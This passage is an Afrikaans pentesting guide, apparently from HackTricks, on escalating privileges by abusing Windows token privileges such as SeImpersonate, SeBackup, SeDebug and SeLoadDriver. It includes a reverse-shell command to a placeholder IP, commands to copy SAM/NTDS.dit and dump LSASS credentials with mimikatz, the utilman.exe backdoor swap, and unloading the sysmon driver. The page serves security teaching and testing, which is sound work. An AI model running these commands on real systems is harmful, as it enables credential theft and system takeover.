# Misbruik van Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

As jy **nie weet wat Windows Access Tokens is nie**, lees hierdie bladsy voordat jy voortgaan:


{{#ref}}
access-tokens.md
{{#endref}}

**Jy kan dalk voorregte eskaleer deur tokens wat jy reeds het, te misbruik.**

### SeImpersonatePrivilege

Hierdie privilege laat ’n proses toe om ’n token na te boots (maar nie te skep nie) wanneer dit ’n handle na daardie token kan verkry. ’n Bevoorregte token kan van ’n Windows-diens (DCOM) verkry word deur dit te dwing om NTLM-authentication teen ’n exploit uit te voer, wat daarna die uitvoering van ’n proses met SYSTEM-voorregte moontlik maak.<sup>[[2]](#references)</sup> Hierdie primitive kan uitgebuit word met tools soos [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (waarvoor WinRM gedeaktiveer moet wees), [SweetPotato](https://github.com/CCob/SweetPotato) en [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

’n Loopback-only-webtoepassing kan ’n afsonderlike coercion-leidraad wees as ’n plaaslike gebruiker toegang het tot ’n geauthentiseerde endpoint wat ’n versoek na ’n URL wat deur die caller gekies is, onder ’n meer bevoorregte identiteit stuur. Gaan die endpoint se authorization en URL-beperkings na, die werklike uitgaande client-identiteit en authentication-gedrag, en of daardie client ’n listener kan bereik wat deur die gebruiker met minder voorregte beheer word. ’n Geaktiveerde `SeImpersonatePrivilege`, ’n IIS-listener of ’n URL-fetch-parameter alleen bewys nie dat daar ’n bevoorregte token of ’n eskalasiepad is nie. Hou hierdie ondersoek passief; moenie coercion-versoeke stuur tydens enumerasie nie. Sien Microsoft se dokumentasie oor [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) en [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Moderne operator-notas:

- **JuicyPotato is verouderd**: op Windows 10 1809+/Server 2019+ moet jy, afhangend van watter RPC/COM-oppervlak steeds bereikbaar is, eerder **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** of **PrintSpoofer** gebruik.
- As jy ’n diens wat as **`LOCAL SERVICE`** of **`NETWORK SERVICE`** loop, gekompromitteer het en `whoami /priv` ’n **filtered token** sonder `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` wys, herstel eers die rekening se **default privilege set** (byvoorbeeld met **FullPowers**) en probeer daarna weer die potato-familie.<sup>[[3]](#references)</sup>
- Sommige nuwer forks is meer operator-vriendelik as die oorspronklike tools. **SigmaPotato** voeg byvoorbeeld reflection/in-memory-uitvoering en moderne Windows-versoenbaarheid by, terwyl **PrintNotifyPotato** die PrintNotify COM-diens misbruik en dikwels nuttig is wanneer die klassieke Spooler-pad gedeaktiveer is.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Dit is baie soortgelyk aan **SeImpersonatePrivilege**; dit gebruik **dieselfde metode** om ’n bevoorregte token te kry.\
Hierdie voorreg laat jou toe om **’n primary token aan ’n nuwe/opgeskorte proses toe te ken**. Met die bevoorregte impersonation token kan jy ’n primary token aflei (DuplicateTokenEx).\
Met die token kan jy ’n **nuwe proses** met 'CreateProcessAsUser' skep, of ’n proses opgeskort skep en **die token stel** (oor die algemeen kan jy nie die primary token van ’n lopende proses wysig nie).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

As hierdie token geaktiveer is, kan jy **KERB_S4U_LOGON** gebruik om ’n **impersonation token** vir enige ander gebruiker te kry sonder om die credentials te ken, **’n arbitrêre groep** (admins) by die token te voeg, die token se **integrity level** op "**medium**" te stel en hierdie token aan die **huidige thread** toe te ken (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Hierdie voorreg veroorsaak dat die stelsel **lees-toegang** tot enige lêer toestaan (beperk tot leesbewerkings). Dit word gebruik om **die password hashes van plaaslike Administrator**-rekeninge uit die registry te lees; daarna kan tools soos "**psexec**" of "**wmiexec**" met die hash gebruik word (die Pass-the-Hash-tegniek). Hierdie tegniek misluk egter in twee gevalle: wanneer die Local Administrator-rekening gedeaktiveer is, of wanneer ’n policy administratiewe regte verwyder van Local Administrators wat op afstand verbind.<sup>[[2]](#references)</sup>\
In die praktyk is die betroubaarste ingeboude werksvloei gewoonlik **VSS + `robocopy /b`**: skep/stel ’n shadow copy beskikbaar en kopieer dan `SAM`/`SYSTEM` of `NTDS.dit` in **backup mode**, wat die file ACLs omseil.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Jy kan **hierdie voorreg misbruik** met:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- volg **IppSec** by [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Of soos verduidelik in die afdeling oor **voorregte eskaleer met Backup Operators** van:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Hierdie voorreg verleen **skryftoegang** tot enige stelsellêer, ongeag die lêer se Access Control List (ACL). Dit bied talle moontlikhede vir eskalasie, waaronder die vermoë om **dienste te wysig**, DLL Hijacking uit te voer en **debuggers** via Image File Execution Options in te stel, asook verskeie ander tegnieke.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege is ’n kragtige toestemming, veral nuttig wanneer ’n gebruiker tokens kan naboots, maar ook wanneer SeImpersonatePrivilege ontbreek. Hierdie vermoë berus op die vermoë om ’n token na te boots wat dieselfde gebruiker verteenwoordig en waarvan die integriteitsvlak nie hoër is as dié van die huidige proses nie.<sup>[[2]](#references)</sup>

**Sleutelpunte:**

- **Nabootsing sonder SeImpersonatePrivilege:** Dit is moontlik om SeCreateTokenPrivilege vir EoP te benut deur onder spesifieke voorwaardes tokens na te boots.
- **Voorwaardes vir tokennabootsing:** Suksesvolle nabootsing vereis dat die teikentoken aan dieselfde gebruiker behoort en ’n integriteitsvlak het wat gelyk aan of laer is as dié van die proses wat die nabootsing probeer.
- **Skep en wysig nabootsingstokens:** Gebruikers kan ’n nabootsingstoken skep en dit uitbrei deur ’n bevoorregte groep se SID (Security Identifier) by te voeg.

### SeLoadDriverPrivilege

Hierdie voorreg laat ’n proses toe om **toestelbestuurders te laai en te ontlaai** deur ’n registerinskrywing met spesifieke `ImagePath`- en `Type`-waardes te skep. Omdat direkte skryftoegang tot `HKLM` (HKEY_LOCAL_MACHINE) beperk is, kan `HKCU` (HKEY_CURRENT_USER) eerder gebruik word. ’n Spesifieke pad is egter nodig sodat die kern die `HKCU`-inskrywing as ’n bestuurderkonfigurasie herken.<sup>[[2]](#references)</sup>

Moderne offensiewe gebruik is gewoonlik **BYOVD** (bring your own vulnerable driver): laai ’n **ondertekende maar kwesbare** kernbestuurder en gebruik dan sy IOCTLs om beskermings te deaktiveer of na kernkode-uitvoering oor te gaan. Hou in gedagte dat die **Microsoft vulnerable driver blocklist** en/of **HVCI/Memory Integrity** op onlangse Windows 11/Server-bouweergawes dikwels ouer openbare kettings laat misluk; klassieke voorbeelde in die styl van `szkg64.sys` is dus nie meer oral betroubaar nie.

Hierdie pad is `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, waar `<RID>` die Relative Identifier van die huidige gebruiker is. Binne `HKCU` moet hierdie hele pad geskep word, en twee waardes moet ingestel word:<sup>[[2]](#references)</sup>

- `ImagePath`, wat die pad is na die binêre lêer wat uitgevoer moet word
- `Type`, met die waarde `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Stappe om te volg:**

1. Gebruik `HKCU` in plaas van `HKLM` weens beperkte skryftoegang.
2. Skep die pad `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` binne `HKCU`, waar `<RID>` die huidige gebruiker se Relative Identifier voorstel.
3. Stel `ImagePath` in op die binêre lêer se uitvoeringspad.
4. Stel `Type` in op `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Meer maniere om hierdie privilege te misbruik: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Dit is soortgelyk aan **SeRestorePrivilege**. Die primêre funksie daarvan laat ’n proses toe om **eienaarskap van ’n objek te aanvaar**, en omseil sodoende die vereiste vir eksplisiete diskresionêre toegang deur WRITE_OWNER-toegangsregte te voorsien. Die proses behels dat eienaarskap van die bedoelde registersleutel eers verkry word om dit te kan skryf, waarna die DACL gewysig word om skryfbewerkings toe te laat.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Hierdie privilege laat jou toe om **ander prosesse te debug**, insluitend om uit die geheue te lees en daarin te skryf. Met hierdie privilege kan verskeie memory injection-strategieë gebruik word wat die meeste antivirus- en host intrusion prevention-oplossings kan ontduik.<sup>[[2]](#references)</sup>

Onthou dat `SeDebugPrivilege` op moderne Windows gewoonlik genoeg is om **nie-beskermde SYSTEM-prosesse** oop te maak en hul tokens te dupliseer, maar dit waarborg **nie** dat jy toegang tot **LSASS** kan kry nie. As **RunAsPPL / LSA Protection** geaktiveer is, kan nie-beskermde prosesse nie in LSASS lees of kode daarin inject nie, selfs al is `SeDebugPrivilege` beskikbaar. In daardie geval, steel ’n token van ’n ander nie-PPL SYSTEM-proses, of kombineer dit met ’n PPL bypass/BYOVD eerder as om te aanvaar dat `procdump` sal werk. Sien [hierdie bladsy](sedebug-+-seimpersonate-copy-token.md) vir ’n volledige voorbeeld van token copying met `SeDebugPrivilege` + `SeImpersonatePrivilege`.

#### Dump memory

Jy kan [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) uit die [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) gebruik om **die geheue van ’n proses vas te lê**. Dit kan spesifiek op die **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**-proses toegepas word, wat verantwoordelik is vir die berging van gebruikersbewyse nadat ’n gebruiker suksesvol by ’n stelsel aangemeld het.

Jy kan hierdie dump dan in mimikatz laai om wagwoorde te verkry:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

'n Voorheen gestoorde, leesbare LSASS-dump kan beskikbaar wees, selfs al het die huidige rekening nie toestemming om die lewendige beskermde proses vas te lê nie. Beskou 'n dump-lêer of soortgelyk benoemde argief slegs as 'n leidraad: verifieer toegang en inhoud, en bepaal dan of enige herwonne aanmeldbesonderhede steeds geldig is en 'n konteks met hoër voorregte bied. Lêername alleen bewys nie dat 'n argief 'n dump bevat of dat aanmeldbesonderhede herbruikbaar is nie.

#### RCE

As jy 'n `NT SYSTEM`-shell wil kry, kan jy die volgende gebruik:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Hierdie reg (Voer volume-instandhoudingstake uit) kan bevoorregte volume-bewerkings moontlik maak, maar waarborg nie op sigself 'n leesbare raw-volume-handle of arbitrêre lêertoegang nie. Toestel-ACL's, tokenstatus, Windows-weergawe en die aangevraagde bewerking is steeds belangrik. 'n Toegelate volumebeheerbewerking kan eerder lêerstelsel-ACL's verander; dit is 'n muterende aksie wat moontlik die hele volume raak. Op 'n CA-gasheer vereis sertifika misbruik ook toegang tot bruikbare private-sleutelmateriaal, en EFS-beskermde lêers vereis steeds 'n gemagtigde dekripsie- of herstelsleutel. Sien die gedetailleerde voorvereistes hieronder.<sup>[[5]](#references)</sup>

Sien gedetailleerde tegnieke en versagtingsmaatreëls:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Gaan voorregte na

```
whoami /priv
```

Die **tokens wat as Disabled verskyn** kan gewoonlik geaktiveer word, dus kan jy dikwels beide _Enabled_ en _Disabled_ privileges misbruik.

### Aktiveer al die tokens

As jy Disabled privileges het, kan jy die script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) gebruik om al die tokens te aktiveer:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Of die **script** wat in hierdie [**plasing**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) ingebed is.

## Table

Volledige naslaanlys van token-voorregte by [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); die opsomming hieronder lys slegs direkte maniere om die voorreg uit te buit om ’n admin-sessie te verkry of sensitiewe lêers te lees.<sup>[[1]](#references)</sup>

| Privilege                  | Impak       | Gereedskap              | Uitvoeringspad                                                                                                                                                                                                                                                                                                                                     | Opmerkings                                                                                                                                                                                                                                                                                                                    |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3departy-gereedskap     | _"Dit sal ’n gebruiker toelaat om tokens na te boots en na nt system te eskaleer met gereedskap soos potato.exe, rottenpotato.exe en juicypotato.exe"_                                                                                                                                                                                             | Dankie aan [Aurélien Chalot](https://twitter.com/Defte_) vir die bywerking. Ek sal dit binnekort in ’n meer resepagtige formaat probeer herformuleer.                                                                                                                                                                         |
| **`SeBackup`**             | **Bedreiging** | _**Ingeboude opdragte**_ | Lees sensitiewe lêers met `robocopy /b` of toegewyde SeBackup-bewuste kopieerhulpmiddels.                                                                                                                                                                                                                                                         | <p>- Uitstekend vir `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` en soms `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` is gerieflik, maar toegewyde SeBackup-cmdlets/API’s is dikwels meer buigsaam vir geslote/oop lêers.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3departy-gereedskap     | Skep ’n arbitrêre token, insluitend plaaslike adminregte, met `NtCreateToken`.                                                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Dupliseer ’n **nie-PPL** SYSTEM-token of stort geheue vanaf ’n nie-beskermde proses.                                                                                                                                                                                                                                                               | <p>Die storting van LSASS word gewoonlik geblokkeer as RunAsPPL/LSA Protection geaktiveer is.</p><p>Script beskikbaar by [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3departy-gereedskap     | Gebruik die **Potato-familie** / nabootsing van named pipes om SYSTEM te begin (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, ens.).                                                                                                                                                                             | <p>Mees prakties vanaf diensrekeninge soos IIS APPPOOL, MSSQL, geskeduleerde take of enige konteks wat reeds `SeImpersonatePrivilege` besit.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3departy-gereedskap     | <p>1. Laai ’n getekende maar kwesbare kerneldrywer (BYOVD)<br>2. Gebruik die drywer se IOCTL’s om kern-R/W te verkry, sekuriteitsnutsmiddels te deaktiveer of na SYSTEM te eskaleer<br><br>Alternatiewelik kan die voorreg gebruik word om sekuriteitsverwante drywers af te laai met die ingeboude opdrag <code>fltMC</code>, bv. <code>fltMC sysmondrv</code></p> | <p>Ouer publieke drywers soos <code>szkg64.sys</code> word toenemend op moderne Windows deur die bloklys vir kwesbare drywers / HVCI geblokkeer.</p>                                                                                                                                                                        |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Begin PowerShell/ISE met die SeRestore-voorreg beskikbaar.<br>2. Aktiveer die voorreg met <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Hernoem utilman.exe na utilman.old<br>4. Hernoem cmd.exe na utilman.exe<br>5. Sluit die konsole en druk Win+U</p> | <p>Die aanval kan deur sommige AV-sagteware opgespoor word.</p><p>’n Alternatiewe metode maak staat op die vervanging van diensbinêre lêers wat in "Program Files" gestoor is deur dieselfde voorreg te gebruik</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Ingeboude opdragte**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Hernoem cmd.exe na utilman.exe<br>4. Sluit die konsole en druk Win+U</p>                                                                                                                                     | <p>Die aanval kan deur sommige AV-sagteware opgespoor word.</p><p>’n Alternatiewe metode maak staat op die vervanging van diensbinêre lêers wat in "Program Files" gestoor is deur dieselfde voorreg te gebruik.</p>                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3departy-gereedskap     | <p>Manipuleer tokens sodat plaaslike adminregte ingesluit word. SeImpersonate kan vereis word.</p><p>Moet nog geverifieer word.</p>                                                                                                                                                                                                               |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - uitbuitingspaaie van Windows-voorregte na admin](https://github.com/gtworek/Priv2Admin)
- [2] [Misbruik van token-voorregte vir LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Gee my asseblief my voorregte terug!](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b`-rugsteunmodus omseil ACL-kontroles vir lêers/vouers)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Voer volumebestuurstake uit (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Sertifikaat (SeManageVolumePrivilege → CA-sleutel-uitvoer → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
